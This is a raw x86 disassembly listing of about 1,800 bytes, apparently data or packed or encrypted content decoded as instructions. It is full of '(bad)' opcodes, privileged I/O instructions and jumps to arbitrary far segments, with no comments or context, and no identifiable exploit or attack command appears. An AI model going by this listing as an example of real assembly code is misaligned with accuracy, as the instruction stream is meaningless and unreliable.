  414c60:	add    BYTE PTR [eax+0x35e6daee],bh
  414c66:	push   ds
  414c67:	fwait
  414c68:	cli    
  414c69:	mov    DWORD PTR [edx-0x4],0xae4d318f
  414c70:	mov    al,0xf4
  414c72:	dec    ebx
  414c73:	sbb    al,0xbf
  414c75:	mov    dl,0xb9
  414c77:	pop    es
  414c78:	xchg   edi,eax
  414c79:	out    0x46,eax
  414c7b:	jb     0x414c9e
  414c7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c7e:	or     ebx,DWORD PTR [ecx+0x4c]
  414c81:	pop    ebp
  414c82:	in     eax,dx
  414c83:	fprem1 
  414c85:	lods   eax,DWORD PTR ds:[esi]
  414c86:	sub    edx,DWORD PTR [ecx-0x32b5c697]
  414c8c:	cli    
  414c8d:	gs ds jo 0x414cd5
  414c91:	push   cs
  414c92:	mov    ebx,0xa99d6c25
  414c97:	cmove  ecx,DWORD PTR [ecx]
  414c9a:	adc    cl,BYTE PTR [eax+0x1f]
  414c9d:	xchg   ecx,eax
  414c9e:	mov    al,0xa4
  414ca0:	jl     0x414c63
  414ca2:	bound  edx,QWORD PTR [ebx-0x47545ee9]
  414ca8:	mov    ah,0x3f
  414caa:	test   BYTE PTR [edx],al
  414cac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cad:	fwait
  414cae:	dec    esp
  414caf:	sub    eax,0x69800dd3
  414cb4:	les    esp,FWORD PTR [edi-0x1f33a193]
  414cba:	push   ebp
  414cbb:	(bad)  
  414cbd:	inc    eax
  414cbe:	xor    bh,BYTE PTR ds:0x7a040eb6
  414cc4:	jno    0x414c71
  414cc6:	addr16 sub edx,edx
  414cc9:	pop    ecx
  414cca:	jp     0x414ce3
  414ccc:	mov    dh,0x2d
  414cce:	stc    
  414ccf:	int3   
  414cd0:	out    0x26,al
  414cd2:	inc    ebx
  414cd3:	push   0x3e
  414cd5:	rol    BYTE PTR fs:[esi],cl
  414cd8:	ja     0x414c8f
  414cda:	jbe    0x414cdf
  414cdc:	scas   eax,DWORD PTR es:[edi]
  414cdd:	push   eax
  414cde:	fdiv   DWORD PTR [ebp+eiz*1-0x3f]
  414ce2:	push   ecx
  414ce3:	or     edi,ebx
  414ce5:	in     eax,dx
  414ce6:	pop    ecx
  414ce7:	sbb    BYTE PTR [esi],bl
  414ce9:	dec    ecx
  414cea:	adc    DWORD PTR [ebp-0x1f3ca193],ebx
  414cf0:	or     eax,DWORD PTR [ebx]
  414cf2:	push   0x8c8ace76
  414cf7:	sbb    BYTE PTR [ebx],al
  414cf9:	lods   eax,DWORD PTR ds:[esi]
  414cfa:	inc    DWORD PTR [edx]
  414cfc:	mov    esp,0xdc200198
  414d01:	clc    
  414d02:	rcr    BYTE PTR [esi-0x612a29b7],0x8f
  414d09:	into   
  414d0a:	mov    edx,edx
  414d0c:	mov    bh,0x74
  414d0e:	fiadd  DWORD PTR [esi+0x6b]
  414d11:	cs in  al,0xf3
  414d14:	in     al,0x8f
  414d16:	mov    edi,0x10296c9e
  414d1b:	aas    
  414d1c:	mov    ds:0x4dc64fa5,eax
  414d21:	enter  0xd5ee,0xd5
  414d25:	arpl   dx,dx
  414d27:	sbb    esp,edx
  414d29:	xor    dl,0xc2
  414d2c:	aad    0x3c
  414d2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d2f:	stos   DWORD PTR es:[edi],eax
  414d30:	pop    ebx
  414d31:	(bad)  
  414d32:	pop    bx
  414d34:	push   edi
  414d35:	dec    esp
  414d36:	sti    
  414d37:	lahf   
  414d38:	into   
  414d39:	out    dx,eax
  414d3a:	(bad)  
  414d3b:	dec    ebp
  414d3c:	mov    es,WORD PTR [edi+0x378cb198]
  414d42:	inc    esi
  414d43:	mov    ss,WORD PTR [ebp-0x20]
  414d46:	mov    dl,0x3e
  414d48:	cmp    al,BYTE PTR [ebp+0x6d]
  414d4b:	ins    DWORD PTR es:[edi],dx
  414d4c:	mov    gs,WORD PTR [edi]
  414d4e:	repz arpl WORD PTR [edi+0x2571267a],dx
  414d55:	jmp    0x18b9:0xb49e8ec8
  414d5c:	inc    eax
  414d5d:	xadd   DWORD PTR [edx-0x1d],edi
  414d61:	(bad)  
  414d62:	test   eax,0x3062618f
  414d67:	(bad)  
  414d68:	cld    
  414d69:	sbb    cl,BYTE PTR es:[esi+0x6d97034c]
  414d70:	test   al,dl
  414d72:	dec    edi
  414d73:	sbb    BYTE PTR [esi],ah
  414d75:	pop    esi
  414d76:	add    bl,bl
  414d78:	jnp    0x414de6
  414d7a:	add    dh,0x1b
  414d7d:	xchg   esi,ebx
  414d7f:	mov    eax,0xdf0a300c
  414d84:	aad    0xcd
  414d86:	rol    al,cl
  414d88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d89:	xchg   DWORD PTR [ebp-0x17ac87e7],ebp
  414d8f:	sub    eax,0xab27f857
  414d94:	mov    al,0xf0
  414d96:	aam    0x83
  414d98:	popa   
  414d99:	cmp    eax,0xc340017f
  414d9e:	aaa    
  414d9f:	xchg   DWORD PTR [eax],edi
  414da1:	sbb    bl,al
  414da3:	push   edx
  414da4:	loop   0x414d3a
  414da6:	rcr    cl,0xf5
  414da9:	ror    DWORD PTR [eax],1
  414dab:	xchg   esp,eax
  414dac:	(bad)  
  414dad:	shl    BYTE PTR [eax],1
  414daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414db0:	mov    BYTE PTR [edx+0x38fcc5a4],cl
  414db6:	bound  esi,QWORD PTR [eax-0x1b]
  414db9:	(bad)  
  414dbb:	repz sub eax,0x43ada274
  414dc1:	dec    eax
  414dc2:	lods   eax,DWORD PTR ds:[esi]
  414dc3:	jbe    0x414e04
  414dc5:	ins    DWORD PTR es:[edi],dx
  414dc6:	in     al,dx
  414dc7:	sbb    DWORD PTR [ebp-0x19],0xbf42b043
  414dce:	je     0x414e0c
  414dd0:	outs   dx,DWORD PTR ds:[esi]
  414dd1:	or     bh,cl
  414dd3:	xchg   edi,eax
  414dd4:	mov    ebx,0x487d18b
  414dd9:	jbe    0x414db5
  414ddb:	ret    0x8963
  414dde:	es cwde 
  414de0:	fwait
  414de1:	das    
  414de2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414de3:	sub    dh,BYTE PTR [esi]
  414de5:	cmp    cl,BYTE PTR [edi-0x3746663a]
  414deb:	push   0x60
  414ded:	jne    0x414dea
  414def:	mov    eax,ds:0xbdec8dab
  414df4:	fbld   TBYTE PTR [ebp+0x1b47cc34]
  414dfa:	inc    esp
  414dfb:	mov    al,ds:0x9934d0b
  414e00:	and    eax,0x70394ad2
  414e05:	ins    BYTE PTR es:[edi],dx
  414e06:	jecxz  0x414da0
  414e08:	inc    ecx
  414e09:	scas   eax,DWORD PTR es:[edi]
  414e0a:	ja     0x414e2d
  414e0c:	jb     0x414e5c
  414e0e:	jmp    0xe37b:0xecc4ad40
  414e15:	xchg   edi,eax
  414e16:	aas    
  414e17:	hlt    
  414e18:	sbb    BYTE PTR [eax],0xff
  414e1b:	xchg   esp,eax
  414e1c:	cs push ss
  414e1e:	pop    di
  414e20:	and    BYTE PTR [eax+0x1c4cd5b1],0x93
  414e27:	mov    eax,ds:0x34a30be2
  414e2c:	les    ecx,FWORD PTR [eax+0x4a2511cf]
  414e32:	xchg   edi,eax
  414e33:	dec    ebp
  414e34:	(bad)  
  414e35:	(bad)  
  414e36:	jle    0x414dc8
  414e38:	dec    esi
  414e39:	xor    BYTE PTR [eax],cl
  414e3b:	jae    0x414de6
  414e3d:	jmp    0x3ad0cdff
  414e42:	jae    0x414e7f
  414e44:	jb     0x414dd1
  414e46:	out    0x33,al
  414e48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e49:	adc    eax,0x9df15e25
  414e4e:	mov    bh,al
  414e50:	dec    edi
  414e51:	adc    eax,0x1960a45c
  414e56:	pop    ebp
  414e57:	adc    al,BYTE PTR [ebx+ecx*1]
  414e5a:	in     eax,dx
  414e5b:	jnp    0x414e90
  414e5d:	shl    DWORD PTR [eax-0x19],cl
  414e60:	(bad)  
  414e61:	mov    bl,0x6e
  414e63:	in     al,dx
  414e64:	or     DWORD PTR [ecx-0x7d],ebp
  414e67:	xchg   edi,eax
  414e68:	jle    0x414ee3
  414e6a:	in     al,dx
  414e6b:	stos   BYTE PTR es:[edi],al
  414e6c:	mov    bl,0xc8
  414e6e:	repz fxch st(1)
  414e71:	push   esp
  414e72:	cwde   
  414e73:	daa    
  414e74:	mov    ecx,0x35fbad9a
  414e79:	sti    
  414e7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e7b:	xchg   edx,eax
  414e7c:	and    DWORD PTR [edi+ebx*2-0x8d43789],ecx
  414e83:	pop    ecx
  414e84:	icebp  
  414e85:	test   DWORD PTR [esi-0x3e],ebx
  414e88:	jns    0x414ed6
  414e8a:	jns    0x414ed7
  414e8c:	loopne 0x414e57
  414e8e:	in     al,dx
  414e8f:	jae    0x414ec5
  414e91:	push   edx
  414e92:	xchg   eax,ecx
  414e94:	pop    ecx
  414e95:	mov    esp,0x4d9a7a3d
  414e9a:	pop    ecx
  414e9b:	mov    ch,0x16
  414e9d:	lock dec esp
  414e9f:	pop    ebx
  414ea0:	shl    BYTE PTR [ebx],cl
  414ea2:	sar    DWORD PTR [ecx-0x2cc2f117],0xe
  414ea9:	xor    DWORD PTR [edx+esi*1-0x73],edx
  414ead:	in     al,0x50
  414eaf:	push   0xffffffa7
  414eb1:	test   DWORD PTR [edx],esp
  414eb3:	out    dx,al
  414eb4:	sbb    ecx,DWORD PTR [esi-0x9]
  414eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414eb8:	ret    
  414eb9:	scas   al,BYTE PTR es:[edi]
  414eba:	jnp    0x414ed3
  414ebc:	cmp    edx,edx
  414ebe:	sub    BYTE PTR [edi-0x1cc306e9],0x70
  414ec5:	jp     0x414e5c
  414ec7:	arpl   bp,cx
  414ec9:	stos   DWORD PTR es:[edi],eax
  414eca:	xchg   ebx,eax
  414ecb:	xchg   ebx,eax
  414ecc:	ja     0x414ee7
  414ece:	mov    ds:0xa34caffa,eax
  414ed3:	in     al,dx
  414ed4:	pop    ecx
  414ed5:	pop    eax
  414ed6:	lahf   
  414ed7:	xchg   DWORD PTR [ebx],esp
  414ed9:	rcl    esp,cl
  414edb:	rcl    BYTE PTR [ebp-0x285245cf],cl
  414ee1:	jbe    0x414eea
  414ee3:	retf   0xd293
  414ee6:	adc    ecx,eax
  414ee8:	addr16 xchg ecx,eax
  414eea:	mov    DWORD PTR [ebp+0x630e241],edx
  414ef0:	mov    dh,0xf6
  414ef2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ef3:	sbb    al,0xc6
  414ef5:	cwde   
  414ef6:	loopne 0x414f6e
  414ef8:	push   ss
  414ef9:	ja     0x414eae
  414efb:	xchg   edx,eax
  414efc:	scas   al,BYTE PTR es:[edi]
  414efd:	jae    0x414f28
  414eff:	gs call 0x61775c4e
  414f05:	sub    BYTE PTR [edi+esi*1],ah
  414f08:	stos   DWORD PTR es:[edi],eax
  414f09:	ds or  eax,0x1ff4748f
  414f0f:	(bad)  
  414f10:	mov    bh,0x84
  414f12:	aam    0xad
  414f14:	aad    0x7c
  414f16:	mov    ch,0x9
  414f18:	lods   eax,DWORD PTR ds:[esi]
  414f19:	sub    al,0x4c
  414f1b:	inc    ebx
  414f1c:	daa    
  414f1d:	out    dx,al
  414f1e:	int    0x67
  414f20:	pop    ss
  414f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f22:	push   ds
  414f23:	mov    al,ds:0x3b3d4f
  414f28:	aad    0xda
  414f2a:	popa   
  414f2b:	retf   0x5a56
  414f2e:	call   0xee24:0x3b492f5
  414f35:	ja     0x414ed7
  414f37:	mov    eax,ds:0xdf5b61ef
  414f3c:	lea    ebx,cs:[eax+eax*8+0x76]
  414f41:	jg     0x414ecc
  414f43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f44:	lods   eax,DWORD PTR ds:[esi]
  414f45:	cmp    al,0x7c
  414f47:	ds sbb eax,0x19e82476
  414f4d:	cmp    cl,BYTE PTR [esi+0x44d3936e]
  414f53:	stos   DWORD PTR es:[edi],eax
  414f54:	test   DWORD PTR [esp+eax*1-0x5a36d3d6],esi
  414f5b:	lods   eax,DWORD PTR ds:[esi]
  414f5c:	shl    BYTE PTR [ecx],0x96
  414f5f:	out    0xdd,al
  414f61:	icebp  
  414f62:	inc    edx
  414f63:	mov    esp,0xc00f39ee
  414f68:	pop    es
  414f69:	jbe    0x414fad
  414f6b:	xchg   edi,eax
  414f6c:	rcr    DWORD PTR [esi],0x87
  414f6f:	dec    esi
  414f70:	outs   dx,BYTE PTR ds:[esi]
  414f71:	or     ah,BYTE PTR [ebp+0x500cd31c]
  414f77:	dec    ebp
  414f78:	test   BYTE PTR [edi],al
  414f7a:	add    esp,ecx
  414f7c:	lods   al,BYTE PTR ds:[esi]
  414f7d:	int3   
  414f7e:	fwait
  414f7f:	stc    
  414f80:	xchg   edi,eax
  414f81:	mov    ds:0x43c65ef6,eax
  414f86:	mov    eax,ds:0x16144714
  414f8b:	icebp  
  414f8c:	in     eax,0x92
  414f8e:	cs inc edx
  414f90:	xchg   ebx,eax
  414f91:	jns    0x414f69
  414f93:	enter  0x7b1b,0x60
  414f97:	test   al,0xdf
  414f99:	xchg   ebp,eax
  414f9a:	and    ch,BYTE PTR [ebx]
  414f9c:	shl    ah,cl
  414f9e:	loopne 0x414f40
  414fa0:	add    BYTE PTR [edi+ebx*1-0x26],bh
  414fa4:	fsubr  QWORD PTR [ebx-0x192e4383]
  414faa:	std    
  414fab:	add    DWORD PTR [edx+0x1d36b4c3],eax
  414fb1:	stc    
  414fb2:	sub    al,BYTE PTR [bx+di]
  414fb5:	pop    es
  414fb6:	push   edx
  414fb7:	imul   ebx,ebx,0x1d
  414fba:	int3   
  414fbb:	pop    ebp
  414fbc:	inc    esi
  414fbd:	iret   
  414fbe:	icebp  
  414fbf:	xor    BYTE PTR [ecx+edx*8-0x468491a6],0x46
  414fc7:	loopne 0x415044
  414fc9:	jbe    0x415024
  414fcb:	call   DWORD PTR [esi+0x3a]
  414fce:	push   0x20
  414fd0:	(bad)  
  414fd1:	adc    eax,0x49386c51
  414fd6:	fistp  QWORD PTR ds:0xb530075c
  414fdc:	pop    edx
  414fdd:	out    dx,al
  414fde:	add    dl,BYTE PTR [esi+0x7a3c6c31]
  414fe4:	fbstp  TBYTE PTR [edx+0x65753ce7]
  414fea:	hlt    
  414feb:	inc    esp
  414fec:	xchg   ebp,eax
  414fed:	cdq    
  414fee:	mov    eax,0x4a719dc9
  414ff3:	outs   dx,BYTE PTR ds:[esi]
  414ff4:	pop    ss
  414ff5:	cld    
  414ff6:	call   0x5688:0x771f9036
  414ffd:	dec    esi
  414ffe:	sub    DWORD PTR [edi],edi
  415000:	into   
  415001:	xor    eax,0x58a42b41
  415006:	dec    eax
  415007:	adc    eax,edi
  415009:	(bad)  
  41500a:	pop    ss
  41500b:	out    dx,eax
  41500c:	sbb    eax,ebx
  41500e:	jl     0x415083
  415010:	addr16 dec esi
  415012:	call   0x4a17:0x7172d5e3
  415019:	dec    ebp
  41501a:	jns    0x41506b
  41501c:	and    BYTE PTR [ebx+0x3dce1745],dl
  415022:	mov    ds:0xa5434054,al
  415027:	add    eax,0x865312b4
  41502c:	xchg   ebp,eax
  41502d:	xor    al,0xaf
  41502f:	inc    ecx
  415030:	sbb    DWORD PTR es:[esi-0x2de856bc],edx
  415037:	loope  0x41506d
  415039:	ja     0x414ffb
  41503b:	and    al,BYTE PTR [eax+0x9]
  41503e:	xor    BYTE PTR [edi-0x26],al
  415041:	xlat   BYTE PTR ds:[ebx]
  415042:	mov    bl,0x88
  415044:	les    edx,FWORD PTR [edx]
  415046:	jne    0x415043
  415048:	or     DWORD PTR [edx+0x1],eax
  41504b:	jb     0x414ff6
  41504d:	jae    0x415044
  41504f:	fsubr  QWORD PTR [eax]
  415051:	pop    ds
  415052:	hlt    
  415053:	sub    dh,cl
  415055:	jge    0x414ffd
  415057:	aam    0xe5
  415059:	sub    BYTE PTR [ebx+0x2bc0834a],dl
  41505f:	out    dx,eax
  415060:	sbb    eax,0xd5fcd508
  415065:	test   eax,0x2d2a8aa3
  41506a:	imul   ebx,DWORD PTR [ebx+esi*4-0x3e30356e],0xfffffff9
  415072:	shl    BYTE PTR [esi+0x66],0x75
  415076:	nop    DWORD PTR [eax-0x6b70af22]
  41507d:	ja     0x415027
  41507f:	dec    ecx
  415080:	std    
  415081:	sub    ch,0x3e
  415084:	stos   DWORD PTR es:[edi],eax
  415085:	cmp    ecx,DWORD PTR [ecx]
  415087:	jmp    0xc9a9:0x9118c456
  41508e:	and    al,0x1d
  415090:	pop    ss
  415091:	hlt    
  415092:	fist   WORD PTR [edx]
  415094:	(bad)  
  415095:	or     eax,0x8427b466
  41509a:	js     0x4150fb
  41509c:	mov    eax,ds:0x966ca91d
  4150a1:	aas    
  4150a2:	jbe    0x4150d8
  4150a4:	or     al,0x26
  4150a6:	ficomp WORD PTR [eax-0x3eca69bb]
  4150ac:	mov    ah,BYTE PTR [edx]
  4150ae:	out    0x69,al
  4150b0:	out    0x2,al
  4150b2:	or     al,0xd
  4150b4:	and    edx,esp
  4150b6:	mov    bh,0x19
  4150b8:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150ba:	dec    ecx
  4150bb:	aam    0x22
  4150bd:	fiadd  WORD PTR [ecx+ebx*4]
  4150c0:	in     al,dx
  4150c1:	sbb    al,0xee
  4150c3:	pop    edx
  4150c4:	test   BYTE PTR [eax+0x1],cl
  4150c7:	and    BYTE PTR [edx-0x63],ch
  4150ca:	jmp    0x72065dc2
  4150cf:	hlt    
  4150d0:	xchg   dh,bh
  4150d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150d3:	jbe    0x415058
  4150d5:	mov    eax,0x83653e7a
  4150da:	les    edi,FWORD PTR [edi+0x2e]
  4150dd:	mov    ebx,0xed99d87d
  4150e2:	cmp    BYTE PTR [eax],0x47
  4150e5:	mov    ecx,edx
  4150e7:	xor    al,0xf9
  4150e9:	int    0x13
  4150eb:	jmp    0x93cd9a29
  4150f0:	stos   DWORD PTR es:[edi],eax
  4150f1:	fadd   QWORD PTR [ecx+0x3d]
  4150f4:	jmp    0xe9d2:0xe15df354
  4150fb:	add    edx,DWORD PTR [ecx+0x20]
  4150fe:	or     bl,BYTE PTR [eax+0x7e]
  415101:	shl    DWORD PTR [ebp-0x3529f6e4],cl
  415107:	pop    esi
  415108:	je     0x41517f
  41510a:	out    dx,al
  41510b:	jecxz  0x4150d6
  41510d:	jge    0x41511c
  41510f:	test   BYTE PTR [ebx-0x3c],bl
  415112:	js     0x415115
  415114:	mov    ds:0xf62703fb,eax
  415119:	cs jecxz 0x415198
  41511c:	xchg   esp,eax
  41511d:	xchg   ebx,eax
  41511e:	lock aam 0xbd
  415121:	outs   dx,BYTE PTR ds:[esi]
  415122:	jb     0x41517c
  415124:	inc    ecx
  415125:	cmp    dh,0x62
  415128:	push   ss
  415129:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41512a:	or     al,0x2d
  41512c:	mov    cl,0x64
  41512e:	loop   0x4150e0
  415130:	mov    bh,0x56
  415132:	and    cl,bh
  415134:	shr    edi,0xc7
  415137:	loope  0x415194
  415139:	ret    0x99ad
  41513c:	mov    edi,0x5a1e99f4
  415141:	retf   
  415142:	pop    ds
  415143:	xchg   edx,eax
  415144:	jno    0x4151bb
  415146:	inc    esp
  415147:	or     ebp,ecx
  415149:	(bad)  [ecx+0x35]
  41514c:	mov    esp,DWORD PTR [eax]
  41514e:	call   0xbbc4:0x5f8f07a0
  415155:	fwait
  415156:	inc    ebx
  415157:	inc    ecx
  415158:	test   eax,0x46f766cf
  41515d:	cmp    eax,DWORD PTR [ebx-0x51]
  415160:	dec    ecx
  415161:	mov    db1,ebx
  415164:	outs   dx,DWORD PTR ds:[esi]
  415165:	push   ebp
  415166:	jge    0x415166
  415168:	repnz fimul DWORD PTR [eax]
  41516b:	aas    
  41516c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41516d:	add    eax,edx
  41516f:	ds (bad) 
  415171:	mov    bl,0xa9
  415173:	ret    
  415174:	xchg   ecx,eax
  415176:	pop    edi
  415177:	xor    esp,DWORD PTR [ebx+ebx*8+0x4d0e55ea]
  41517e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41517f:	mov    esi,0x3f744455
  415184:	dec    edx
  415185:	inc    edx
  415186:	call   0x6d28:0x685b6f2e
  41518d:	dec    edx
  41518e:	nop    DWORD PTR [ebx-0x7e2a5d0d]
  415195:	sbb    al,0x67
  415197:	mov    WORD PTR [ecx],gs
  415199:	scas   eax,DWORD PTR es:[edi]
  41519a:	dec    ebp
  41519b:	adc    DWORD PTR [eax-0x39d0cf0f],esp
  4151a1:	sub    DWORD PTR [eax+0x1f],ebp
  4151a4:	push   esp
  4151a5:	add    dh,ah
  4151a7:	add    DWORD PTR [eax-0x1d397282],ebp
  4151ad:	jle    0x4151a9
  4151af:	add    ah,BYTE PTR [ebp-0x3d]
  4151b2:	nop
  4151b3:	mov    DWORD PTR [esi-0x70],esi
  4151b6:	fcmove st,st(4)
  4151b8:	std    
  4151b9:	cld    
  4151ba:	stc    
  4151bb:	es mov eax,0xc6bdbc1d
  4151c1:	jb     0x4151ca
  4151c3:	sbb    BYTE PTR [ebp-0x6bf254fe],ch
  4151c9:	in     al,0xd4
  4151cb:	and    BYTE PTR [ebx],dh
  4151cd:	and    BYTE PTR [edx],dl
  4151cf:	adc    esi,DWORD PTR [edx]
  4151d1:	ss pop edi
  4151d3:	mov    ecx,0x48d920bb
  4151d8:	fptan  
  4151da:	jno    0x4151ad
  4151dc:	xchg   ebx,eax
  4151dd:	shr    DWORD PTR [edx-0x57],cl
  4151e0:	je     0x4151d2
  4151e2:	fist   DWORD PTR [edi-0x2c4ffe8c]
  4151e8:	lods   eax,DWORD PTR ds:[esi]
  4151e9:	jne    0x415203
  4151eb:	pop    esp
  4151ec:	add    dh,0x49
  4151ef:	dec    ebx
  4151f0:	add    al,0x80
  4151f2:	xor    ch,bl
  4151f4:	dec    edx
  4151f5:	sub    BYTE PTR [ebp-0x10a3815b],0x51
  4151fc:	outs   dx,BYTE PTR ds:[esi]
  4151fd:	scas   eax,DWORD PTR es:[edi]
  4151fe:	test   DWORD PTR [ecx],0x379c059a
  415204:	rsm    
  415206:	fs pop es
  415208:	dec    esp
  415209:	sbb    esi,DWORD PTR [ebx+0x4689b56]
  41520f:	inc    edx
  415210:	fcmove st,st(5)
  415212:	pop    ecx
  415213:	cs nop
  415215:	stos   DWORD PTR es:[edi],eax
  415216:	jne    0x4151c1
  415218:	or     BYTE PTR [edi],al
  41521a:	xchg   esi,eax
  41521b:	hlt    
  41521c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41521d:	fld    DWORD PTR [esi]
  41521f:	out    dx,al
  415220:	sbb    bh,bh
  415222:	test   BYTE PTR [edx+0x53c94e90],dh
  415228:	jp     0x4152a4
  41522a:	cli    
  41522b:	pusha  
  41522c:	cmp    eax,0xc24cddbe
  415231:	inc    ebp
  415232:	sub    BYTE PTR [edi-0x3d43a1dc],bh
  415238:	pop    ebp
  415239:	push   esi
  41523a:	mov    edi,0xe3635a96
  41523f:	stc    
  415240:	scas   eax,DWORD PTR es:[edi]
  415241:	mov    bl,0x7c
  415243:	sub    BYTE PTR [edx+0x22195037],dl
  415249:	lea    esp,[esi+ebx*2+0x76]
  41524d:	add    al,0x61
  41524f:	test   BYTE PTR [edi],0x66
  415252:	loop   0x41525e
  415254:	scas   eax,DWORD PTR es:[edi]
  415255:	sub    DWORD PTR [ecx],edx
  415257:	push   ecx
  415258:	(bad)  
  415259:	(bad)  
  41525a:	out    dx,eax
  41525b:	fcomp  st(3)
  41525d:	adc    esi,DWORD PTR [edi-0x1b]
  415260:	stos   BYTE PTR es:[edi],al
  415261:	jmp    0x4151fd
  415263:	ss ret 0x5aa
  415267:	dec    eax
  415268:	popa   
  415269:	jae    0x41528c
  41526b:	or     bh,dh
  41526d:	sahf   
  41526e:	(bad)  
  41526f:	jno    0x415293
  415271:	call   0xd3a27686
  415276:	jno    0x4152f3
  415278:	clc    
  415279:	js     0x4152cf
  41527b:	inc    ebp
  41527c:	sbb    BYTE PTR [edi+0x763cd66f],bh
  415282:	imul   ebp,edx,0x53
  415285:	stos   DWORD PTR es:[edi],eax
  415286:	add    esi,DWORD PTR [ebx]
  415288:	mov    al,ds:0x1d198fb5
  41528d:	sbb    ebp,DWORD PTR [ecx-0x5e]
  415290:	cdq    
  415291:	fild   WORD PTR [edi+0x2f]
  415294:	sbb    esp,DWORD PTR [edx]
  415296:	push   ebp
  415297:	pusha  
  415298:	dec    edi
  415299:	imul   edx,DWORD PTR [edi-0x6320713f],0x3a06e508
  4152a3:	xor    BYTE PTR [esi],al
  4152a5:	cmc    
  4152a6:	jle    0x4152c3
  4152a8:	in     eax,0x6a
  4152aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152ab:	shr    BYTE PTR [eax],0x49
  4152ae:	push   ebp
  4152af:	jo     0x4152fc
  4152b1:	retf   0xcd0d
  4152b4:	push   ebp
  4152b5:	sbb    ebx,ebp
  4152b7:	int3   
  4152b8:	push   0x39
  4152ba:	xor    eax,0xc45a709b
  4152bf:	xor    al,0xda
  4152c1:	mov    ebp,0x6ae7ed4c
  4152c6:	in     eax,0xba
  4152c8:	add    DWORD PTR [edx+ebx*8],ecx
  4152cb:	(bad)  
  4152cd:	lea    edi,[ebx-0xe]
  4152d0:	sbb    eax,0x2adb791c
  4152d5:	adc    al,0xd6
  4152d7:	jmp    0x9811:0x282fa5c0
  4152de:	inc    eax
  4152df:	push   0xf47ff5f0
  4152e4:	xor    eax,0x7635db1
  4152e9:	stos   DWORD PTR es:[edi],eax
  4152ea:	inc    edx
  4152eb:	(bad)  
  4152ec:	sbb    al,0xcc
  4152ee:	mov    al,0x6d
  4152f0:	dec    ebp
  4152f1:	pushf  
  4152f2:	jo     0x415337
  4152f4:	pop    edi
  4152f5:	sbb    ebp,DWORD PTR [esi+0x709066b6]
  4152fb:	xchg   edx,eax
  4152fc:	shl    BYTE PTR [edx+0x28],cl
  4152ff:	push   ebx
  415300:	mov    dh,0x8e
  415302:	fs xchg ebp,eax
  415304:	jg     0x415383
  415306:	mov    dl,0x9d
  415308:	adc    esp,DWORD PTR [ebp+0x4]
  41530b:	jp     0x415317
  41530d:	loop   0x4152e4
  41530f:	sub    al,0x36
  415311:	shl    BYTE PTR [edx],0x87
  415314:	data16 cmps BYTE PTR cs:[esi],BYTE PTR es:[edi]
  415317:	ss std 
  415319:	jle    0x4152f3
  41531b:	xor    dl,BYTE PTR [ebp-0x1]
  41531e:	push   ss
  41531f:	int    0x53
  415321:	mov    dl,0x9f
  415323:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415324:	(bad)
  415327:	inc    eax
  415328:	lds    esp,FWORD PTR [ebp+ebx*1-0x60]
  41532c:	lahf   
  41532d:	mov    dl,0x42
  41532f:	mov    cl,0xdd
  415331:	sbb    DWORD PTR [ebp-0x2],ecx
  415334:	cli    
  415335:	inc    eax
  415336:	sub    eax,0x8424e988
  41533b:	cli    
  41533c:	cmp    al,0xd3
  41533e:	sbb    eax,0x830b0548
  415343:	pop    ebp
  415344:	xor    BYTE PTR [esp+edi*1-0x62],dl
  415348:	push   0xf3f01d1a
  41534d:	aaa    
  41534e:	sti    
  41534f:	pop    ds
  415350:	std    
  415351:	jbe    0x415365
  415353:	add    cl,BYTE PTR [ecx-0x2dcbe11e]
  415359:	mov    dl,ch
  41535b:	call   0x3b1cfaeb
  415360:	mov    bh,0x80
  415362:	retf   0x6c92
  415365:	rol    bl,cl
  415367:	test   BYTE PTR [ebx-0x30],ah
  41536a:	fmul   QWORD PTR [eax+0x7c]
  41536d:	adc    cl,dl
  41536f:	popf   
  415370:	daa    
  415371:	push   0x4d2be754
  415376:	hlt    
  415377:	(bad)  
  415378:	xor    eax,DWORD PTR ds:[ebx]
  41537b:	push   ds
  41537c:	fwait
  41537d:	and    al,0x44
  41537f:	enter  0x1225,0x20
  415383:	or     eax,0x888a6be
  415388:	test   bl,bl
  41538a:	mov    dl,dh
  41538c:	xor    ecx,DWORD PTR [edi]
  41538e:	dec    ebx
  41538f:	and    eax,0x97cca1c
  415394:	shl    BYTE PTR [ebx+eiz*4-0x44],cl
  415398:	xchg   esp,eax
  415399:	cmc    
  41539a:	xchg   ebp,eax
  41539b:	loope  0x4153cb
  41539d:	pusha  
  41539e:	fdiv   DWORD PTR [ebx-0x6ca9ea88]
  4153a4:	cmp    BYTE PTR [ebp-0x2540b915],ch
  4153aa:	push   es
  4153ab:	sub    al,0xde
  4153ad:	mov    al,0x66
  4153af:	aad    0x30
  4153b1:	xor    ch,dh
  4153b3:	mov    esp,0x9c516191
  4153b8:	loop   0x4153a8
  4153ba:	dec    esi
  4153bb:	push   edx
  4153bc:	pusha  
  4153bd:	aaa    
  4153be:	(bad)  
  4153bf:	add    al,al
  4153c1:	push   ss
  4153c2:	sbb    DWORD PTR [edi+0x3feccaeb],ebp
  4153c8:	pop    edi
  4153c9:	pop    es
  4153ca:	inc    eax
  4153cb:	not    dl
  4153cd:	imul   edi,DWORD PTR [ebx+edx*1+0x28eac5ba],0xc98d1056
  4153d8:	xlat   BYTE PTR ds:[ebx]
